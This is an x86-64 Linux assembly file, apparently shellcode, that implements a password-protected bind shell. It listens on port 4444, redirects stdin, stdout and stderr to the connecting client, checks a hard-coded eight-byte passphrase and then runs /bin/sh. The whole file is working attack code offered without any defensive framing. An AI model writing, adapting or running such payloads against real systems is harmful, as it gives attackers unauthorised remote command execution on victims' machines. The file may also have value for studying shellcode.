global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41


	mov rax, 41
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax

	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11
	mov word [rsp-8], 0x2
	sub rsp, 8


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	mov rax, 49
	
	mov rsi, rsp
	mov rdx, 16
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	mov rax, 50
	mov rsi, 2
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	
	mov rax, 43
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

	; store the client socket description 
	mov r9, rax 

        ; close parent

        mov rax, 3
        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
        mov rax, 33
        mov rsi, 0
        syscall

        mov rax, 33
        mov rsi, 1
        syscall

        mov rax, 33
        mov rsi, 2
        syscall


	;---------------------
read:
	;password: 8byte = ASCI: ABCDEFGH = HEX: 41 42 43 44 45 46 47 48 
	; in reverse
	mov rbx, 0x4847464544434241

	;---------------------
	;syscall reference http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
	;read syscall and check for passphrase
	;ssize_t read(int fd, void *buf, size_t count);
	;fd = r9 in rdi
	mov rdi, r9

	;buf = ... in rsi
	sub rsp,8	;place for read pw
	mov rsi,rsp

	;sycallnumber 0 in rax
	xor rax,rax

	;count = ... in rdx
	xor rdx,rdx
	add rdx,8

	syscall


	;compare result
	cmp rbx, [rsi]
	jnz read




        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall

